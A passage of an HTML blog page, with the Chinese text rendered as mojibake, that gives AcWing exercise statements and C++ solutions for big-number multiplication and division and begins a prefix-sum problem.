id="AcWing-793-é«˜ç²¾åº¦ä¹˜æ³•"><a href="https://www.acwing.com/problem/content/795/">AcWing 793. é«˜ç²¾åº¦ä¹˜æ³•</a></h2><p>ç»™å®šä¸¤ä¸ªéè´Ÿæ•´æ•°ï¼ˆä¸å«å‰å¯¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œè¯·ä½ è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>Ã—</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \times B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼Œç¬¬äºŒè¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>Ã—</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \times B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>A</mi><mtext>çš„é•¿åº¦</mtext><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le A çš„é•¿åº¦ \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">çš„é•¿åº¦</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mi>B</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">0 \le B \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>23</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>6</code></pre><h3 id="æ³•1-é«˜ç²¾åº¦-ä½ç²¾åº¦">æ³•1 é«˜ç²¾åº¦ * ä½ç²¾åº¦</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += A[i] * b;</span><br><span class="line">    C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a;</span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">mul</span>(A, b);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-é«˜ç²¾åº¦-é«˜ç²¾åº¦">æ³•2 é«˜ç²¾åº¦ * é«˜ç²¾åº¦</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">C</span><span class="params">(A.size() + B.size() + <span class="number">1</span>, <span class="number">0</span>)</span></span>;  <span class="comment">// åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; B.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">      C[i + j] += A[i] * B[j];  <span class="comment">// +=, è€Œé=</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; C.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += C[i];</span><br><span class="line">    C[i] = t % <span class="number">10</span>;</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">auto</span> C = <span class="built_in">mul</span>(A, B);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-794-é«˜ç²¾åº¦é™¤æ³•"><a href="https://www.acwing.com/problem/content/796/">AcWing 794. é«˜ç²¾åº¦é™¤æ³•</a></h2><p>ç»™å®šä¸¤ä¸ªéè´Ÿæ•´æ•°ï¼ˆä¸å«å‰å¯¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mtext>ï¼Œ</mtext><mi>B</mi></mrow><annotation encoding="application/x-tex">Aï¼ŒB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œè¯·ä½ è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi mathvariant="normal">/</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A / B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> çš„å•†å’Œä½™æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼Œç¬¬äºŒè¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…±ä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œè¾“å‡ºæ‰€æ±‚çš„å•†ï¼Œç¬¬äºŒè¡Œè¾“å‡ºæ‰€æ±‚ä½™æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>A</mi><mtext>çš„é•¿åº¦</mtext><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le Açš„é•¿åº¦ \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">çš„é•¿åº¦</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>B</mi><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le B \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> ä¸€å®šä¸ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>72</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>31</code></pre><h3 id="é«˜ç²¾åº¦é™¤æ³•">é«˜ç²¾åº¦é™¤æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;  <span class="comment">// å’Œ+ - *ä¸ä¸€æ ·</span></span><br><span class="line">    r = <span class="number">10</span> * r + A[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">    r %= b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());  <span class="comment">// è®©æ•°å­—ä½ä½å›åˆ°æ•°ç»„ä½ä½</span></span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a;</span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b, r);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>, r);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‰ç¼€å’Œä¸å·®åˆ†">å‰ç¼€å’Œä¸å·®åˆ†</h1><h2 id="AcWing-795-å‰ç¼€å’Œ"><a href="https://www.acwing.com/problem/content/797/">AcWing 795. å‰ç¼€å’Œ</a></h2><p>è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°åºåˆ—ã€‚</p><p>æ¥ä¸‹æ¥å†è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªè¯¢é—®ï¼Œæ¯ä¸ªè¯¢é—®è¾“å…¥ä¸€å¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo separator="true">,</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">l, r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>ã€‚</p><p>å¯¹äºæ¯ä¸ªè¯¢é—®ï¼Œè¾“å‡ºåŸåºåˆ—ä¸­ä»ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> ä¸ªæ•°åˆ°ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span> ä¸ªæ•°çš„å’Œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´æ•°æ•°åˆ—ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªè¯¢é—®çš„åŒºé—´èŒƒå›´ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªè¯¢é—®çš„ç»“æœã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>l</mi><mo>â‰¤</mo><mi>r</mi><mo>â‰¤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le l \le r \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation 